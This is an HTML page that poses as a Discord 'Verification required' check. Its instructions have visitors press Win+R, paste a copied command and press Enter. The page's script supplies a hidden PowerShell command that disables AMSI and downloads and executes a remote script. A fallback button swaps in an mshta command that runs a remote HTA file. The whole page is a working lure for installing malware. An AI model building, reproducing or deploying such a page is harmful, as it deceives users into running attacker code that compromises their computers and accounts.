<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord</title>
<style>
  :root{--bg:#1e1f22;--card:#313338;--txt:#dbdee1;--mut:#b5bac1;--blur:#5865f2;--blurh:#4752c4}
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
    background:var(--bg);font-family:"gg sans","Noto Sans",Helvetica,Arial,sans-serif;color:var(--txt);padding:20px}
  .card{width:100%;max-width:440px;background:var(--card);border-radius:8px;padding:24px 24px 20px;
    box-shadow:0 8px 24px rgba(0,0,0,.4)}
  .hd{display:flex;align-items:center;gap:10px;margin-bottom:16px}
  .hd svg{width:28px;height:28px;fill:#5865f2}
  .hd b{font-size:15px;color:#f2f3f5}
  h1{font-size:20px;margin:0 0 8px;color:#f2f3f5}
  .sub{font-size:14px;color:var(--mut);margin:0 0 16px}
  ol{margin:0 0 14px;padding-left:20px;font-size:14px;line-height:1.9;color:var(--txt)}
  kbd{background:#232428;border:1px solid #1e1f22;border-radius:4px;padding:1px 6px;
    font:600 12px/1.5 ui-monospace,Consolas,monospace;color:#f2f3f5}
  .code{background:#1e1f22;border:1px solid #2b2d31;border-radius:6px;padding:10px;
    font:12.5px/1.5 ui-monospace,Consolas,monospace;color:#23a55a;white-space:nowrap;
    overflow-x:auto;margin-bottom:12px}
  button{width:100%;background:var(--blur);color:#fff;border:0;border-radius:4px;padding:11px;
    font:600 15px/1 inherit;cursor:pointer;transition:background .15s}
  button:hover{background:var(--blurh)}
  button.ok{background:#23a55a}
  .trouble{text-align:center;font-size:13px;margin:12px 0 0;color:#00a8fc;cursor:pointer}
  .foot{text-align:center;font-size:12px;color:#949ba4;margin:14px 0 0}
</style>
</head>
<body>
<div class="card">
  <div class="hd">
    <svg viewBox="0 0 127.14 96.36"><path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15ZM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69Zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69Z"/></svg>
    <b>Discord</b>
  </div>
  <h1>Verification required</h1>
  <p class="sub">Complete the check below to continue.</p>
  <ol>
    <li>Press <kbd>Win</kbd> + <kbd>R</kbd></li>
    <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste</li>
    <li>Press <kbd>Enter</kbd> and wait a few seconds</li>
  </ol>
  <div class="code" id="cmd"></div>
  <button id="btn">Copy command</button>
  <p class="trouble" id="tr">Not working? Try the other method</p>
  <p class="foot">Verification is done automatically in the background</p>
</div>
<script>
const host = location.host, t = Math.random().toString().slice(2,10);
const B = `powershell -nop -w hidden -ep bypass -c "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'};$f=$a.GetFields('NonPublic,Static')|?{$_.Name -eq 'amsiInitFailed'};$f.SetValue($null,$true);iex((New-Object Net.WebClient).DownloadString('https://${host}/s.txt?t=${t}'))"`;
const A = `mshta "https://${host}/p.hta?t=${t}"`;
let cur = B, alt = false;

const box = document.getElementById('cmd'), btn = document.getElementById('btn');
box.textContent = cur;

function copy(txt){
  const a = document.createElement('textarea');
  a.value = txt; a.style.position = 'fixed'; a.style.opacity = '0';
  document.body.appendChild(a); a.select(); document.execCommand('copy'); a.remove();
}

btn.onclick = () => {
  copy(cur);
  btn.textContent = 'Copied'; btn.classList.add('ok');
  setTimeout(() => { btn.textContent = 'Copy command'; btn.classList.remove('ok'); }, 1600);
};

document.getElementById('tr').onclick = () => {
  alt = !alt; cur = alt ? A : B; box.textContent = cur;
  btn.textContent = 'Copy command';
  document.getElementById('tr').textContent = alt ? 'Back to the first method' : 'Not working? Try the other method';
};
</script>
</body>
</html>
